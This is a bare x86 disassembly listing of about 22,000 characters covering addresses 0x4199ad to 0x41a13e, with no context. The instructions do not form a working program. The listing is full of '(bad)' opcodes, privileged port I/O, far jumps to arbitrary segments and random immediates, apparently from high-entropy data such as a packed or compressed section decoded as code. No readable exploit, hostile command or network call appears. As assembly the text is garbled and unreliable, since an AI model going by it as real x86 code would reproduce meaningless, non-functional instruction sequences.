  4199ad:	stc    
  4199ae:	and    bl,dh
  4199b0:	std    
  4199b1:	push   ss
  4199b2:	push   ds
  4199b3:	inc    ebp
  4199b4:	xchg   ecx,eax
  4199b5:	loopne 0x41999c
  4199b7:	add    BYTE PTR [ebp-0x615e2331],0xa4
  4199be:	mov    ss,esp
  4199c0:	adc    eax,0xf46b4ee2
  4199c5:	or     eax,DWORD PTR [eax-0x1]
  4199c8:	jae    0x41999d
  4199ca:	imul   edi,DWORD PTR [ebp-0x67],0xffffffea
  4199ce:	xchg   esp,eax
  4199cf:	sub    eax,0x3b611305
  4199d4:	mov    ebp,DWORD PTR [edi]
  4199d6:	call   0xb1dc223a
  4199db:	push   ss
  4199dc:	dec    esp
  4199dd:	pop    ebx
  4199de:	cmp    edi,0xffffffef
  4199e1:	push   ebp
  4199e2:	je     0x419a34
  4199e4:	or     BYTE PTR [esi],bl
  4199e6:	mov    esp,eax
  4199e8:	sub    DWORD PTR [ebx-0x30],esi
  4199eb:	adc    dl,BYTE PTR [ecx-0x5e2d438f]
  4199f1:	cmp    ebx,0x756123f7
  4199f7:	neg    DWORD PTR [ecx+eiz*4-0x543a3fa6]
  4199fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ff:	adc    dl,bl
  419a01:	mov    eax,0xb0d86fee
  419a06:	sbb    esp,ebx
  419a08:	or     dh,dl
  419a0a:	dec    edx
  419a0b:	arpl   WORD PTR [ebp-0x26200a92],si
  419a11:	or     DWORD PTR [edi],ebx
  419a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a14:	ficom  WORD PTR [ebx-0x44]
  419a17:	lods   al,BYTE PTR ds:[esi]
  419a18:	loopne 0x4199e7
  419a1a:	cmp    esi,DWORD PTR [eax]
  419a1c:	ins    BYTE PTR es:[edi],dx
  419a1d:	(bad)
  419a21:	iret   
  419a22:	mov    eax,0xb4120e42
  419a27:	inc    edi
  419a28:	push   ss
  419a29:	call   0x50ec3e57
  419a2e:	ss ja  0x4199df
  419a31:	or     eax,0x2f5c333c
  419a36:	pop    es
  419a37:	mov    ebp,0xbbfe3843
  419a3c:	inc    esp
  419a3d:	jae    0x419a43
  419a3f:	ficomp DWORD PTR fs:0x1c5b4ff2
  419a46:	inc    edi
  419a47:	pop    ebx
  419a48:	or     DWORD PTR [edx-0x67573383],esi
  419a4e:	test   DWORD PTR [edi-0x7a],edx
  419a51:	inc    ecx
  419a52:	fimul  WORD PTR [edx+eiz*8]
  419a55:	push   es
  419a56:	aam    0xc6
  419a58:	inc    ebp
  419a59:	pop    DWORD PTR [eax-0x67]
  419a5c:	rcl    BYTE PTR [eax+0x51f53aa2],0xf0
  419a63:	cld    
  419a64:	xor    eax,0x30b937e4
  419a69:	call   0x439cb34
  419a6e:	xor    al,0x77
  419a70:	ins    DWORD PTR es:[edi],dx
  419a71:	push   eax
  419a72:	add    BYTE PTR [ebx-0x28372312],dh
  419a78:	add    al,0xd7
  419a7a:	cmp    BYTE PTR [ebp+0x18],cl
  419a7d:	retf   0xce75
  419a80:	pop    edx
  419a81:	or     al,0x23
  419a83:	and    eax,0x59d533d1
  419a88:	push   0x22c57368
  419a8d:	mov    ecx,0x40820465
  419a92:	ins    DWORD PTR es:[edi],dx
  419a93:	push   ebx
  419a94:	push   esi
  419a95:	cmp    BYTE PTR [edx],cl
  419a97:	pop    ecx
  419a98:	xor    DWORD PTR [ebx-0x42],0xffffffa9
  419a9c:	iret   
  419a9d:	dec    ecx
  419a9e:	rcr    BYTE PTR [ebp-0x357583f6],cl
  419aa4:	shr    dl,0x6c
  419aa7:	push   ss
  419aa8:	mov    cl,0x6b
  419aaa:	es push cs
  419aac:	sub    BYTE PTR [ebp-0x2f716691],0xb2
  419ab3:	loopne 0x419af6
  419ab5:	mov    al,ds:0xd722c43e
  419aba:	mov    ebp,0xd45d4ab2
  419abf:	shl    DWORD PTR [edi+0x18],0x65
  419ac3:	jle    0x419a55
  419ac5:	aad    0xa5
  419ac7:	sbb    DWORD PTR [edx-0x75],ecx
  419aca:	mov    cl,0x79
  419acc:	addr16 mov ch,al
  419acf:	and    al,0x51
  419ad1:	sub    eax,0xcb7fbb1a
  419ad6:	(bad)  
  419ad8:	xor    al,0x78
  419ada:	jp     0x419abf
  419adc:	mov    bh,0x6f
  419ade:	jecxz  0x419aaf
  419ae0:	fldcw  WORD PTR [edx+edx*4+0x37]
  419ae4:	mov    ds:0x6215f4e4,eax
  419ae9:	jecxz  0x419aa7
  419aeb:	add    BYTE PTR [ebx+0x6b5f126e],bh
  419af1:	xchg   DWORD PTR [ecx+ebp*4+0x72],ebp
  419af5:	sub    al,0x1
  419af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419af8:	ins    BYTE PTR es:[edi],dx
  419af9:	jb     0x419af5
  419afb:	inc    edx
  419afc:	dec    ebx
  419afd:	add    DWORD PTR [ebp+esi*2-0x3b],ebx
  419b01:	aad    0xc9
  419b03:	push   0x61109039
  419b08:	pop    ss
  419b09:	stos   DWORD PTR es:[edi],eax
  419b0a:	repz cdq 
  419b0c:	out    0x33,eax
  419b0e:	mov    bl,0x4a
  419b10:	lds    ebx,FWORD PTR [ebx+0x7]
  419b13:	in     eax,dx
  419b14:	push   esi
  419b15:	div    esp
  419b17:	aas    
  419b18:	icebp  
  419b19:	dec    edx
  419b1a:	jge    0x419b6b
  419b1c:	dec    eax
  419b1d:	stc    
  419b1e:	xchg   ebp,eax
  419b1f:	mov    al,0x19
  419b21:	sti    
  419b22:	test   eax,0x7653d33c
  419b27:	rol    BYTE PTR [edi-0x23],1
  419b2a:	test   al,0xf1
  419b2c:	fistp  WORD PTR [eax-0x460afd0e]
  419b32:	adc    eax,0xe2b4bc51
  419b37:	cli    
  419b38:	scas   al,BYTE PTR es:[edi]
  419b39:	call   0xd7430d4e
  419b3e:	stos   DWORD PTR es:[edi],eax
  419b3f:	dec    eax
  419b40:	out    dx,al
  419b41:	ret    
  419b42:	or     eax,eax
  419b44:	loop   0x419b1d
  419b46:	sti    
  419b47:	daa    
  419b48:	out    0x87,al
  419b4a:	cmp    bh,BYTE PTR [ecx-0x653647f4]
  419b50:	push   0xffffffbb
  419b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b53:	int    0x77
  419b55:	in     al,dx
  419b56:	xor    eax,DWORD PTR [edx-0x5e]
  419b59:	inc    edx
  419b5a:	cmp    al,0x7c
  419b5c:	out    dx,al
  419b5d:	in     eax,dx
  419b5e:	ss push 0x639c9ef1
  419b64:	xchg   ecx,eax
  419b65:	into   
  419b66:	add    ch,bh
  419b68:	mov    dh,0xde
  419b6a:	jmp    0xb24817eb
  419b6f:	test   eax,0x4be75c40
  419b74:	enter  0x40d6,0x39
  419b78:	ret    0xe0c1
  419b7b:	nop
  419b7c:	ins    DWORD PTR es:[edi],dx
  419b7d:	int    0x4d
  419b7f:	xchg   edi,eax
  419b80:	mov    eax,0x2d313da4
  419b85:	loope  0x419b1f
  419b87:	into   
  419b88:	mov    edx,?
  419b8a:	sub    eax,0x4cb1fcb3
  419b8f:	dec    esp
  419b90:	and    dl,BYTE PTR [esi]
  419b92:	sub    BYTE PTR [edx-0x3f],al
  419b95:	mov    dh,0x48
  419b97:	inc    ecx
  419b98:	pop    ecx
  419b99:	jge    0x419b88
  419b9b:	gs out 0xa0,al
  419b9e:	fbld   TBYTE PTR [ebp-0x22]
  419ba1:	inc    edi
  419ba2:	and    eax,0xbc730d
  419ba7:	or     esp,ebp
  419ba9:	xchg   edi,eax
  419baa:	stos   BYTE PTR es:[edi],al
  419bab:	pop    esi
  419bac:	mov    ds:0x5f4d0cfb,eax
  419bb1:	pusha  
  419bb2:	push   ebp
  419bb3:	dec    edi
  419bb4:	xchg   esp,eax
  419bb5:	dec    eax
  419bb6:	test   BYTE PTR ds:0x8e479ceb,dl
  419bbc:	dec    ebx
  419bbd:	adc    cl,BYTE PTR [edx]
  419bbf:	sub    esi,DWORD PTR [ebp-0x1f]
  419bc2:	test   eax,0x19b5715d
  419bc7:	clc    
  419bc8:	sti    
  419bc9:	mov    al,ds:0x4bdb2f01
  419bce:	sub    edx,ecx
  419bd0:	imul   ebp,DWORD PTR [eax],0x79
  419bd3:	jbe    0x419bfd
  419bd5:	push   es
  419bd6:	int3   
  419bd7:	mov    ebp,0xd3a03676
  419bdc:	sbb    eax,0x14235c06
  419be1:	into   
  419be2:	(bad)  
  419be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419be4:	push   ebp
  419be5:	and    BYTE PTR [ebp+0x13],dl
  419be8:	mov    edi,ebx
  419bea:	lods   eax,DWORD PTR ds:[esi]
  419beb:	push   esp
  419bec:	sub    esp,ebx
  419bee:	add    ah,cl
  419bf0:	repnz xchg esi,eax
  419bf2:	rcr    bh,0xf3
  419bf5:	sbb    DWORD PTR [edx+eiz*8+0x5d51b19c],eax
  419bfc:	push   0x36
  419bfe:	test   BYTE PTR [ebx+ebp*1],ah
  419c01:	imul   edx,DWORD PTR [ecx-0x1434383c],0xa18ba4a3
  419c0b:	adc    al,cl
  419c0d:	add    eax,0x692ef520
  419c12:	stos   BYTE PTR es:[edi],al
  419c13:	mov    ebx,0x3675cf80
  419c18:	leave  
  419c19:	fwait
  419c1a:	mov    ?,WORD PTR [edi-0x25]
  419c1d:	mov    esi,0x27649da7
  419c22:	jno    0x419be5
  419c24:	mov    dh,0xef
  419c26:	and    al,BYTE PTR [edi+0x55]
  419c29:	mov    al,ds:0x6c48cca4
  419c2e:	enter  0x5e11,0xaa
  419c32:	push   0xab520cd1
  419c37:	jmp    0xe2d9:0x583a9ee8
  419c3e:	xchg   edx,eax
  419c3f:	scas   eax,DWORD PTR es:[edi]
  419c40:	sbb    BYTE PTR [ecx],0x4
  419c43:	xchg   ebp,eax
  419c44:	and    ah,BYTE PTR [ebx+0x7ed29552]
  419c4a:	cmp    al,0x12
  419c4c:	(bad)
  419c4f:	in     al,dx
  419c50:	test   al,0x4a
  419c52:	xor    edx,DWORD PTR [esi+0x37ca0880]
  419c58:	fidiv  WORD PTR [edi]
  419c5a:	xchg   esi,eax
  419c5b:	loopne 0x419bf3
  419c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c5e:	push   0xd414a6c5
  419c63:	nop
  419c64:	ins    DWORD PTR es:[edi],dx
  419c65:	and    eax,0x1551e7ea
  419c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c6b:	shl    DWORD PTR [edi+eiz*8],0xc5
  419c6f:	push   ebx
  419c70:	daa    
  419c71:	mov    eax,ds:0x81f3e714
  419c76:	add    al,0x0
  419c78:	stos   BYTE PTR es:[edi],al
  419c79:	push   0xffffffbd
  419c7b:	and    al,0xa6
  419c7d:	fst    st(0)
  419c7f:	stos   BYTE PTR es:[edi],al
  419c80:	jnp    0x419cac
  419c82:	dec    eax
  419c83:	retf   
  419c84:	stos   DWORD PTR es:[edi],eax
  419c85:	lods   eax,DWORD PTR ds:[esi]
  419c86:	lahf   
  419c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c88:	sar    DWORD PTR [ebx],cl
  419c8a:	mov    ebp,0xcb726830
  419c8f:	pop    ecx
  419c90:	rcr    eax,cl
  419c92:	or     DWORD PTR [ecx+0x3c0adb7b],edi
  419c98:	push   0x91fe708f
  419c9d:	jge    0x419cfc
  419c9f:	sbb    eax,0x7e8de23c
  419ca4:	retf   0x5cd9
  419ca7:	jne    0x419c50
  419ca9:	daa    
  419caa:	enter  0xba85,0x2f
  419cae:	pop    eax
  419caf:	push   es
  419cb0:	pop    ebx
  419cb1:	fild   DWORD PTR [esi]
  419cb3:	mov    esi,0x676380a5
  419cb8:	mov    al,0xc
  419cba:	xor    BYTE PTR [esp+edx*1+0x7ba68450],0xee
  419cc2:	and    DWORD PTR [edx+0x29eec41c],ebx
  419cc8:	mov    al,ds:0x6354b93a
  419ccd:	pop    ebp
  419cce:	ret    
  419ccf:	scas   eax,DWORD PTR es:[edi]
  419cd0:	or     BYTE PTR [edx+0x12],ch
  419cd3:	inc    edx
  419cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cd5:	(bad)  
  419cd6:	loopne 0x419d3c
  419cd8:	dec    ecx
  419cd9:	je     0x419d3d
  419cdb:	cmp    eax,0x2a32a1be
  419ce0:	ins    DWORD PTR es:[edi],dx
  419ce1:	mov    ecx,0x272367f
  419ce6:	lahf   
  419ce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ce8:	fwait
  419ce9:	sub    BYTE PTR [eax+0x3620b5af],bl
  419cef:	or     ebx,edx
  419cf1:	push   esp
  419cf2:	cmp    ebp,DWORD PTR [ecx]
  419cf4:	inc    ebp
  419cf5:	retf   0x1ecb
  419cf8:	outs   dx,BYTE PTR ds:[esi]
  419cf9:	in     al,dx
  419cfa:	mov    ebx,0x2fca00f9
  419cff:	or     DWORD PTR [ebx+0x48],0xffffffd9
  419d03:	push   0xffffffec
  419d05:	push   es
  419d06:	out    0xa0,eax
  419d08:	adc    BYTE PTR [ecx-0x9],0x98
  419d0c:	xchg   DWORD PTR [ecx+ecx*1+0x2bab9d83],eax
  419d13:	jae    0x419d11
  419d15:	jg     0x419d43
  419d17:	int3   
  419d18:	int3   
  419d19:	sub    ecx,DWORD PTR [esi-0x43]
  419d1c:	cld    
  419d1d:	in     al,0x56
  419d1f:	jb     0x419d32
  419d21:	xchg   esp,eax
  419d22:	pop    ebx
  419d23:	out    0xd1,al
  419d25:	xchg   esp,ebp
  419d27:	add    eax,0x7ae0a875
  419d2c:	fcomp  QWORD PTR [ecx-0x69dca1d6]
  419d32:	jmp    0x352a:0x4e6df50a
  419d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d3a:	ins    BYTE PTR es:[edi],dx
  419d3b:	lods   eax,DWORD PTR ds:[esi]
  419d3c:	push   0x211662f7
  419d41:	gs cld 
  419d43:	adc    al,BYTE PTR [ebp+edi*8-0x37d15bf5]
  419d4a:	and    eax,DWORD PTR [edi-0x54674db]
  419d50:	cli    
  419d51:	xchg   esi,eax
  419d52:	pushf  
  419d53:	fs mov esi,0x3aad4157
  419d59:	ss mov dh,ah
  419d5c:	mov    eax,edx
  419d5e:	mov    edi,0x424618b2
  419d63:	mov    edi,0xf82c79a2
  419d68:	dec    ebx
  419d69:	pop    edi
  419d6a:	inc    edx
  419d6b:	sub    dl,BYTE PTR [edi]
  419d6d:	mov    esi,0xfba1b542
  419d72:	rol    BYTE PTR ds:0x2919b182,1
  419d78:	je     0x419d5b
  419d7a:	out    dx,eax
  419d7b:	push   eax
  419d7c:	aaa    
  419d7d:	fld    TBYTE PTR [edx+ecx*4-0x1]
  419d81:	push   es
  419d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d83:	xor    WORD PTR [edx+0x67],cx
  419d87:	push   0x252238b3
  419d8c:	cmp    BYTE PTR [edi+0x22],dl
  419d8f:	dec    DWORD PTR [edi-0x410755ee]
  419d95:	(bad)  
  419d96:	mov    eax,DWORD PTR [esi-0x18ede3dd]
  419d9c:	inc    ebx
  419d9d:	pop    esi
  419d9e:	adc    BYTE PTR [ecx+0x7d],bl
  419da1:	inc    eax
  419da2:	sub    eax,edi
  419da4:	pushf  
  419da5:	push   0x3ab86982
  419daa:	repz ret 
  419dac:	rcr    DWORD PTR [esi-0x62],1
  419daf:	les    edx,FWORD PTR [esi+0x5c]
  419db2:	adc    DWORD PTR [ebx-0x68],esi
  419db5:	pop    edx
  419db6:	dec    edx
  419db7:	add    BYTE PTR [eax-0x7906f961],bl
  419dbd:	in     al,0xa6
  419dbf:	inc    esi
  419dc0:	fnstsw WORD PTR [ebx]
  419dc2:	mov    dh,0x6
  419dc4:	(bad)  
  419dc5:	ret    
  419dc6:	inc    esp
  419dc7:	jno    0x419d4f
  419dc9:	sbb    ecx,eax
  419dcb:	fwait
  419dcc:	jmp    0x419d7b
  419dce:	push   edi
  419dcf:	adc    DWORD PTR [ecx],ebx
  419dd1:	xchg   esi,eax
  419dd2:	dec    esi
  419dd3:	xadd   cl,al
  419dd6:	icebp  
  419dd7:	mov    bl,0x10
  419dd9:	stc    
  419dda:	or     BYTE PTR ds:0x5687ef64,bh
  419de0:	popa   
  419de1:	(bad)  
  419de2:	and    al,0x13
  419de4:	mov    eax,ds:0x37f70095
  419de9:	jne    0x419e44
  419deb:	xchg   esi,eax
  419dec:	nop
  419ded:	or     eax,0xee98922
  419df2:	cmp    dh,BYTE PTR [edx-0x7bc61137]
  419df8:	sub    ebx,edx
  419dfa:	enter  0x5eb0,0xd6
  419dfe:	in     eax,0x1b
  419e00:	add    ebp,eax
  419e02:	mov    dl,0x4d
  419e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e05:	dec    esp
  419e06:	rcr    DWORD PTR [ebx],cl
  419e08:	add    eax,DWORD PTR [edx*1-0x1c5ef384]
  419e0f:	out    dx,eax
  419e10:	inc    ecx
  419e11:	inc    eax
  419e12:	shr    BYTE PTR [ebx-0x4901dcc9],1
  419e18:	(bad)  
  419e1b:	push   cs
  419e1c:	dec    esi
  419e1d:	add    eax,DWORD PTR [esi]
  419e1f:	mov    edx,0x46a81fc8
  419e24:	push   eax
  419e25:	mov    esi,0x11968840
  419e2a:	jg     0x419de5
  419e2c:	scas   al,BYTE PTR es:[edi]
  419e2d:	cmp    dl,dh
  419e2f:	push   0xffffffb6
  419e31:	fistp  WORD PTR [edx-0x5c0ef2df]
  419e37:	xor    al,0x1a
  419e39:	pusha  
  419e3a:	mov    edi,0x131b7d0
  419e3f:	cwde   
  419e40:	add    eax,0x37b683ca
  419e45:	les    edi,FWORD PTR [edx]
  419e47:	ret    0x3276
  419e4a:	add    DWORD PTR [edx-0x1d],0xffffffe4
  419e4e:	int    0x95
  419e50:	clc    
  419e51:	xlat   BYTE PTR ds:[ebx]
  419e52:	pop    ebx
  419e53:	xor    al,0x0
  419e55:	add    bl,BYTE PTR [eax]
  419e57:	mov    bl,0xb3
  419e59:	loopne 0x419e27
  419e5b:	cmp    bl,BYTE PTR ds:[eax]
  419e5e:	fwait
  419e5f:	push   eax
  419e60:	call   0x2cfb:0x8cfbfaa8
  419e67:	mov    bh,0x88
  419e69:	push   ds
  419e6a:	out    0x46,eax
  419e6c:	dec    eax
  419e6d:	shl    BYTE PTR ds:0x895a0a2,1
  419e73:	ret    
  419e74:	cmp    eax,DWORD PTR [ebp-0x23]
  419e77:	ss loopne 0x419e4f
  419e7a:	ja     0x419e20
  419e7c:	ins    BYTE PTR es:[edi],dx
  419e7d:	int    0x4
  419e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e80:	mov    edi,0x69fda2f9
  419e85:	cmp    al,0x4
  419e87:	repz cld 
  419e89:	fild   QWORD PTR [ebp+0x41]
  419e8c:	adc    DWORD PTR [edi+eax*2+0x66292006],eax
  419e93:	ror    DWORD PTR [esi+0x20],cl
  419e96:	inc    edi
  419e97:	test   BYTE PTR [ecx],dh
  419e99:	adc    al,0xf3
  419e9b:	retf   
  419e9c:	lahf   
  419e9d:	mov    esp,0xcce71c9f
  419ea2:	dec    edx
  419ea3:	mov    dh,0xf7
  419ea5:	loopne 0x419e9c
  419ea7:	inc    edi
  419ea8:	(bad)  
  419ea9:	push   ebp
  419eaa:	jecxz  0x419e91
  419eac:	xchg   esp,eax
  419ead:	pusha  
  419eae:	or     BYTE PTR [esi+0x20],bl
  419eb1:	cmc    
  419eb2:	mov    ebx,0x3dc91ca5
  419eb7:	pop    esi
  419eb8:	fucomp st(0)
  419eba:	ficom  WORD PTR [ebx]
  419ebc:	imul   ebx,DWORD PTR [edi],0xffffffa8
  419ebf:	call   0x5506:0x51069181
  419ec6:	cli    
  419ec7:	dec    esp
  419ec8:	lods   eax,DWORD PTR ds:[esi]
  419ec9:	adc    DWORD PTR [ebp+0x39],edi
  419ecc:	sub    esi,edx
  419ece:	sub    cl,BYTE PTR [ebx+0x1e]
  419ed1:	sub    DWORD PTR [ebx],ebx
  419ed3:	outs   dx,WORD PTR ds:[esi]
  419ed5:	cmp    BYTE PTR [esi],bl
  419ed7:	mov    edi,esp
  419ed9:	pop    ss
  419eda:	mov    edi,0xc6b1d00c
  419edf:	xor    DWORD PTR [ebx-0x5e24ea0f],ecx
  419ee5:	or     bh,bh
  419ee7:	jecxz  0x419eec
  419ee9:	addr16 ss sti 
  419eec:	fisubr DWORD PTR [ecx+0x522f7d6a]
  419ef2:	aaa    
  419ef3:	xchg   esp,eax
  419ef4:	mov    WORD PTR [eax],es
  419ef6:	shl    dl,1
  419ef8:	inc    esp
  419ef9:	imul   BYTE PTR [eax-0x27]
  419efc:	mov    ds:0x5fa28729,al
  419f01:	jecxz  0x419f48
  419f03:	or     BYTE PTR [edi],dl
  419f05:	fwait
  419f06:	div    bh
  419f08:	mov    es,ecx
  419f0a:	ret    
  419f0b:	and    DWORD PTR [ecx+0x2a],eax
  419f0e:	hlt    
  419f0f:	fld    TBYTE PTR [ebx+ecx*4]
  419f12:	ret    
  419f13:	jl     0x419f39
  419f15:	dec    edx
  419f16:	ss and bl,dl
  419f19:	mov    BYTE PTR [esi-0x6f],bh
  419f1c:	sub    eax,0x5e2d2249
  419f21:	mov    ecx,0xbfb98839
  419f26:	xchg   edx,eax
  419f27:	mov    eax,DWORD PTR [eax+0x36]
  419f2a:	aad    0x99
  419f2c:	jecxz  0x419f31
  419f2e:	adc    eax,0x60f3f664
  419f33:	retf   0x2f6d
  419f36:	cmc    
  419f37:	sbb    DWORD PTR [edi+0x16],edx
  419f3a:	pop    edx
  419f3b:	mov    eax,ds:0x55689fb4
  419f40:	xchg   ecx,eax
  419f41:	sub    eax,0x4f02fa52
  419f46:	or     cl,BYTE PTR [edi-0x6a02aeec]
  419f4c:	sub    DWORD PTR [eax-0x37],edx
  419f4f:	push   esi
  419f50:	mov    eax,ds:0x266d071b
  419f55:	js     0x419f5e
  419f57:	je     0x419f49
  419f59:	push   ds
  419f5a:	in     eax,0x8d
  419f5c:	idiv   DWORD PTR [edi-0x20]
  419f5f:	shl    ah,1
  419f61:	cwde   
  419f62:	push   esp
  419f63:	or     al,0x4c
  419f65:	xor    eax,0x8abba5c6
  419f6a:	or     BYTE PTR [edi-0x600014b5],0xc0
  419f71:	jno    0x419f2b
  419f73:	xchg   ecx,eax
  419f74:	lock jg 0x419f7d
  419f77:	adc    BYTE PTR [ebx],dh
  419f79:	aaa    
  419f7a:	cdq    
  419f7b:	adc    BYTE PTR [edx],ah
  419f7d:	mov    esp,0x2fd911fa
  419f82:	xchg   BYTE PTR [ecx-0x2a8101d5],ch
  419f88:	mov    ah,0xe9
  419f8a:	adc    BYTE PTR ds:0xc5dfdb6c,bh
  419f90:	mov    ah,0x5d
  419f92:	cmp    al,0x5a
  419f94:	sbb    ebx,ebx
  419f96:	dec    ecx
  419f97:	lea    esp,[eax+0x4bbeeb6e]
  419f9d:	mov    ebx,0x34d8416
  419fa2:	jge    0x419fae
  419fa4:	sti    
  419fa5:	dec    ecx
  419fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fa7:	inc    esp
  419fa8:	les    edx,FWORD PTR [ecx+0x7a4d5420]
  419fae:	xor    DWORD PTR [ebx-0x59957926],edi
  419fb4:	mov    esp,0x4c08adca
  419fb9:	test   eax,0x58d3acac
  419fbe:	sbb    DWORD PTR es:[esi-0x24],0x2e53d6a2
  419fc6:	ss xchg edx,eax
  419fc8:	mov    ds:0x496b92db,eax
  419fcd:	and    BYTE PTR [ebx+0x29],ah
  419fd0:	xchg   edx,eax
  419fd1:	scas   al,BYTE PTR es:[edi]
  419fd2:	cmp    DWORD PTR [eax-0x180394d],edx
  419fd8:	pop    eax
  419fd9:	fld    DWORD PTR [eax-0x74dbece2]
  419fdf:	(bad)  
  419fe1:	sti    
  419fe2:	pop    es
  419fe3:	test   DWORD PTR [edx-0x16],esi
  419fe6:	rcl    DWORD PTR [edx],1
  419fe8:	mov    edi,0xecdc64a2
  419fed:	or     ecx,DWORD PTR [ebx+0x79]
  419ff0:	cmp    eax,0x12ab4f58
  419ff5:	aas    
  419ff6:	lock loop 0x419fef
  419ff9:	sbb    esi,esi
  419ffb:	add    esp,DWORD PTR [eax+0xb]
  419ffe:	in     eax,0x29
  41a000:	jbe    0x41a020
  41a002:	pop    eax
  41a003:	add    al,0x82
  41a005:	leave  
  41a006:	shl    DWORD PTR [ebp-0x7d],0x7a
  41a00a:	out    0x44,eax
  41a00c:	or     cl,bh
  41a00e:	push   ebp
  41a00f:	retf   
  41a010:	test   BYTE PTR [edi+0x64],bh
  41a013:	mov    bl,0x80
  41a015:	fdivr  QWORD PTR [eax+ebp*4-0x555f384e]
  41a01c:	je     0x41a043
  41a01e:	shr    BYTE PTR [eax+0x17],cl
  41a021:	inc    edx
  41a022:	jp     0x41a01b
  41a024:	adc    eax,0x4e14d7eb
  41a029:	xor    BYTE PTR ds:0x6c4c4575,bh
  41a02f:	std    
  41a030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a031:	test   DWORD PTR [ebp-0x65],edi
  41a034:	xchg   DWORD PTR [eax-0x28],eax
  41a037:	push   ecx
  41a038:	fs scas eax,DWORD PTR es:[edi]
  41a03a:	std    
  41a03b:	mov    cs,WORD PTR [edx]
  41a03d:	nop
  41a03e:	mov    dh,0xe8
  41a040:	jnp    0x41a0c0
  41a042:	je     0x419fd2
  41a044:	ins    DWORD PTR es:[edi],dx
  41a045:	shl    bh,1
  41a047:	lods   eax,DWORD PTR ds:[esi]
  41a048:	cmp    al,BYTE PTR [eax+0x12]
  41a04b:	sbb    BYTE PTR [edi-0x76e5b48f],dh
  41a051:	or     DWORD PTR [edx+eax*8+0x40],ebx
  41a055:	test   al,0x2
  41a057:	in     eax,dx
  41a058:	mov    BYTE PTR [edx+0x55],dh
  41a05b:	repnz out 0x35,al
  41a05e:	xor    bl,BYTE PTR [ecx]
  41a060:	and    esp,eax
  41a062:	mov    DWORD PTR [ebp+0x7b],ebp
  41a065:	mul    BYTE PTR [edi+esi*2]
  41a068:	in     eax,0xe9
  41a06a:	jbe    0x41a009
  41a06c:	ds jbe 0x41a0bf
  41a06f:	mov    edx,0x89ce97ba
  41a074:	jp     0x41a05d
  41a076:	sbb    eax,0x3edfeb66
  41a07b:	mov    eax,0x18647be5
  41a080:	loopne 0x41a0b7
  41a082:	mov    dh,0x50
  41a084:	popf   
  41a085:	aam    0x54
  41a087:	out    0x3f,eax
  41a089:	(bad)  
  41a08a:	int    0xd5
  41a08c:	xor    BYTE PTR [ebp-0x5b],ch
  41a08f:	ins    BYTE PTR es:[edi],dx
  41a090:	mov    cl,BYTE PTR [ebx]
  41a092:	jmp    0x41ad:0x9cd200c7
  41a099:	jmp    0x41a0a3
  41a09b:	push   eax
  41a09c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a09d:	inc    edx
  41a09e:	push   ss
  41a09f:	cmp    al,0x8b
  41a0a1:	ss or  al,0x40
  41a0a4:	lds    esp,FWORD PTR [ecx+edi*4-0x3d]
  41a0a8:	clc    
  41a0a9:	dec    esi
  41a0aa:	sbb    eax,0x22fd7fdb
  41a0af:	stc    
  41a0b0:	inc    edx
  41a0b1:	mov    al,ds:0xcc9cff27
  41a0b6:	push   es
  41a0b7:	mov    ds:0xc3c49f64,eax
  41a0bc:	and    ah,bh
  41a0be:	inc    ebp
  41a0bf:	dec    ebx
  41a0c0:	push   esp
  41a0c1:	xchg   esi,eax
  41a0c2:	in     al,0x38
  41a0c4:	mov    esi,0x6f2e6c2c
  41a0c9:	jo     0x41a0eb
  41a0cb:	adc    al,0xe9
  41a0cd:	std    
  41a0ce:	outs   dx,BYTE PTR ds:[esi]
  41a0cf:	(bad)  
  41a0d0:	stos   DWORD PTR es:[edi],eax
  41a0d1:	xchg   DWORD PTR [edi-0x5b],ecx
  41a0d4:	inc    edi
  41a0d5:	aam    0xf3
  41a0d7:	add    al,0x46
  41a0d9:	test   BYTE PTR [edi+0x76],ch
  41a0dc:	imul   DWORD PTR [eax-0x1a30869f]
  41a0e2:	push   0x34
  41a0e4:	or     ch,0x91
  41a0e7:	pusha  
  41a0e8:	repnz xchg edi,eax
  41a0ea:	cmp    DWORD PTR [ebx+0x30cdfc01],esp
  41a0f0:	cmovb  ecx,DWORD PTR [esi+0x385e9119]
  41a0f7:	cmp    esi,DWORD PTR [edx]
  41a0f9:	mov    DWORD PTR [esi],esi
  41a0fb:	std    
  41a0fc:	retf   
  41a0fd:	outs   dx,BYTE PTR ds:[esi]
  41a0fe:	mov    esp,0x40c4d3d5
  41a103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a104:	sub    edi,DWORD PTR [edx+0x1f]
  41a107:	bound  ebx,QWORD PTR [ecx+0x249eb02b]
  41a10d:	in     al,dx
  41a10e:	sbb    DWORD PTR [ebp-0x4e],ebx
  41a111:	in     al,0x6a
  41a113:	jo     0x41a0d2
  41a115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a116:	mov    edx,0x181030f
  41a11b:	rcr    DWORD PTR [edi+0x5a],0x1c
  41a11f:	lea    esp,[eax+0x775c6324]
  41a125:	fld    TBYTE PTR [ecx]
  41a127:	mov    esi,0xff47dbe6
  41a12c:	pop    ebx
  41a12d:	inc    edi
  41a12e:	pop    ebx
  41a12f:	aad    0x98
  41a131:	retf   0x8c73
  41a134:	inc    ebp
  41a135:	imul   ebp,DWORD PTR [ebp+0x107b1ded],0xffffff92
  41a13c:	adc    esi,esp
  41a13e:	cwde   
